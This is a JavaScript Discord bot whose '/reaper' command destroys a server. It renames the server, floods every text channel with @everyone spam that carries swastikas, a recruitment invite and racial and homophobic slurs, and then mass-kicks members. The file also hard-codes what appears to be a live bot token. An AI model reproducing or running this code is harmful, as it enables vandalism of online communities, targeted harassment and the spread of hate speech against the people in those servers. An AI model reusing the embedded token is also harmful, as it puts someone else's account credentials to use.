const { SlashCommandBuilder } = require('@discordjs/builders');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { Client, Intents } = require('discord.js');

const clientId = '1342002628921659455'; // Replace with your bot's client ID
const guildId = '1376506797879463997';   // Replace with your server's guild ID
const token = 'MTM0MjAwMjYyODkyMTY1OTQ1NQ.Gwnrr8.9NuPNhoZXIc2pLTHRwMxcesoBrunfbQMBL3KjI';     // Replace with your bot's token

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });

const command = new SlashCommandBuilder()
    .setName('reaper')
    .setDescription('Destroys the server (admin only)!');

const commands = [
    command.toJSON(),
];

const rest = new REST({ version: '9' }).setToken(token);

(async () => {
    try {
        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationGuildCommands(clientId, guildId),
            { body: commands },
        );

        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
})();

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'reaper') {
        if (!interaction.member.permissions.has('ADMINISTRATOR')) {
            return interaction.reply({ content: 'You must be an administrator to use this command!', ephemeral: true });
        }

        try {
            await interaction.guild.setName('Join Reaper Today');

            interaction.guild.channels.cache.forEach(async channel => {
                if (channel.isText()) {
                    try {
                        await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
                        //Add more messages here if needed
                        await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
                    } catch (error) {
                        console.error(`Could not send message to channel ${channel.name}: ${error}`);
                    }
                }
            });

            interaction.guild.members.cache.forEach(async member => {
                if (member.kickable) {
                    try {
                        await member.kick('Server destruction initiated by /reaper command.');
                    } catch (error) {
                        console.error(`Could not kick member ${member.user.tag}: ${error}`);
                    }
                } else {
                    console.log(`Could not kick member ${member.user.tag} (likely has higher permissions).`);
                }
            });

            await interaction.reply({ content: 'Server destruction initiated!', ephemeral: true });
        } catch (error) {
            console.error(`An error occurred: ${error}`);
            await interaction.reply({ content: `An error occurred: ${error}`, ephemeral: true });
        }
    }
});

client.login(token);
